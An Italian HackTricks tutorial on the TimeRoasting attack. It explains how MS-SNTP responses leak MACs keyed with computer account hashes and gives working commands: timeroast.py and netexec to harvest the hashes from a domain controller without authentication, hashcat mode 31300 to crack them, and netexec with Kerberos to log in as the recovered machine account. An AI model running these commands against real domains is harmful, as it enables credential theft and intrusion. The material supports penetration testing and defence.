# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting sfrutta l'estensione di autenticazione legacy MS-SNTP. In MS-SNTP, un client può inviare una richiesta di 68 byte che incorpora qualsiasi RID di computer account; il domain controller usa l'hash NTLM (MD4) del computer account come chiave per calcolare una MAC sulla risposta e la restituisce. Gli attacker possono raccogliere queste MS-SNTP MACs in modo non autenticato e crackarle offline (Hashcat mode 31300) per recuperare le password dei computer account.

Vedi la sezione 3.1.5.1 "Authentication Request Behavior" e la 4 "Protocol Examples" nella spec ufficiale MS-SNTP per i dettagli.
![](../../images/Pasted%20image%2020250709114508.png)
Quando l'elemento ExtendedAuthenticatorSupported ADM è false, il client invia una richiesta di 68 byte e incorpora il RID nei 31 bit meno significativi del Key Identifier subfield dell'authenticator.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

Da sezione 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

Il crypto-checksum è basato su MD5 (vedi 3.2.5.1.1) e può essere crackato offline, consentendo il roasting attack.

## Come attaccare

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - script Timeroasting di Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Attacco pratico (unauth) con NetExec + Hashcat

- NetExec può enumerare e raccogliere MACs MS-SNTP per RIDs dei computer senza autenticazione e stampare hash $sntp-ms$ pronti per il cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline con Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
Il cleartext recuperato corrisponde alla password di un computer account. Prova direttamente a usarlo come machine account usando Kerberos (-k) quando NTLM è disabilitato:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Suggerimenti operativi
- Verificare la sincronizzazione dell'ora prima di Kerberos: `sudo ntpdate <dc_fqdn>`
- Se necessario, generare krb5.conf per il realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mappare gli RIDs sui principals successivamente tramite LDAP/BloodHound, una volta ottenuto un foothold autenticato.

## Riferimenti

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
